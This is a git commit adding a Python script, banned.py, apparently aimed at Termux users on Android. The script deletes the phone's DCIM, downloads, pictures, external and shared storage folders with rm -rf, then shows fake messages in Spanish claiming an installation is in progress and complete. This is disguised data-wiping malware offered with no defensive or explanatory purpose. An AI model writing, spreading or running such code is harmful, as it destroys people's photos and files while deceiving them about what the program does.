5165ada39fafc516883123cbd5df9a33a7e5423b
RIP-Network <93273837+RIP-Network@users.noreply.github.com>
2022-06-14 01:12:59 +0200

    Add files via upload

---
+++ banned.py
@@ -0,0 +1,21 @@
+import os, sys, time, io
+
+class color:
+    morado = '\033[95m'
+    blanco = '\033[97m'
+    cyan = '\033[96m'
+    azul  = '\033[94m'
+    verde = '\033[92m'
+    amarillo = '\033[93m'
+    rojo = '\033[91m'
+    fin = '\033[0m'
+
+os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/downloads/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/external-1/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/pictures/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/shared/")
+
+print(verde+"Preparando instalacion por favor espere......"+fin)
+time.sleep(3)
+print(verde+"Instalacion Completada"+fin)
